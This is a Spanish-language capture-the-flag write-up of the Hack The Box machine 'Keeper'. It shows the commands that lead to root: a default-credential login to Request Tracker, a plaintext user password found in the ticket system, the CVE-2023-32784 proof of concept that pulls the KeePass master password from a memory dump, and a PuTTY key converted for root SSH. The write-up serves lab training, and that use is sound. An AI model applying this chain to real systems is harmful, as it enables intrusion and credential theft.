Keeper — HackTheBox Writeup

📋 Información de la máquina
CampoDetalleNombreKeeperOSLinuxDificultadEasyPlataformaHack The BoxTécnicasDefault Credentials, KeePass CVE-2023-32784, PuTTY Key

🔍 1. Enumeración — Nmap
bashnmap -sCV -p- --open -n -Pn -vvv -T5 10.129.229.41 -oN fullscan
PuertoServicio22SSH — OpenSSH 8.9p180HTTP — nginx 1.18.0

🌐 2. Enumeración Web
El puerto 80 redirige a keeper.htb/tickets.keeper.htb.
bashecho "10.129.229.41 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
El subdominio tickets.keeper.htb corre Request Tracker — sistema de tickets.
Credenciales por defecto: root:password ✅

👤 3. Usuario lnorgaard
En Admin → Users encontramos el usuario lnorgaard con la contraseña en texto plano en su perfil:
lnorgaard:Welcome2023!

🔐 4. Acceso SSH
bashssh lnorgaard@10.129.229.41
En el home encontramos RT30000.zip. Lo descargamos a Kali:
bashscp lnorgaard@10.129.229.41:~/RT30000.zip ~/Desktop/ctf-writeups/keeper/
unzip RT30000.zip
Contenido:

KeePassDumpFull.dmp → volcado de memoria de KeePass
passcodes.kdbx → base de datos de KeePass


💥 5. CVE-2023-32784 — KeePass Master Password Dump
bashgit clone https://github.com/CMEPW/keepass-dump-masterkey
cd keepass-dump-masterkey
python3 poc.py ~/Desktop/ctf-writeups/keeper/KeePassDumpFull.dmp
Contraseña maestra encontrada: Rødgrød med fløde

🗝️ 6. Abrir KeePass
bashsudo apt install kpcli -y
kpcli --kdb ~/Desktop/ctf-writeups/keeper/passcodes.kdbx
Contraseña: Rødgrød med fløde
En Network/keeper.htb encontramos una clave privada PuTTY en las Notes.

⬆️ 7. Escalada a root
Guardamos la clave PuTTY en keeper.ppk y quitamos los espacios:
bashsed -i 's/^       //' keeper.ppk
Convertimos a formato OpenSSH:
bashputtygen keeper.ppk -O private-openssh -o keeper_rsa
chmod 600 keeper_rsa
ssh -i keeper_rsa root@10.129.229.41
Root flag
bashcat /root/root.txt

📚 Lecciones aprendidas

Siempre probar credenciales por defecto en servicios conocidos
Las contraseñas guardadas en texto plano en sistemas de tickets son un fallo crítico
CVE-2023-32784 permite extraer la contraseña maestra de KeePass desde un volcado de memoria
Las claves PuTTY .ppk se pueden convertir a OpenSSH con puttygen


🛠️ Herramientas
HerramientaUsoNmapEnumeraciónRequest TrackerCredenciales por defectokeepass-dump-masterkeyCVE-2023-32784kpcliAbrir base de datos KeePassputtygenConvertir clave PuTTY a OpenSSH
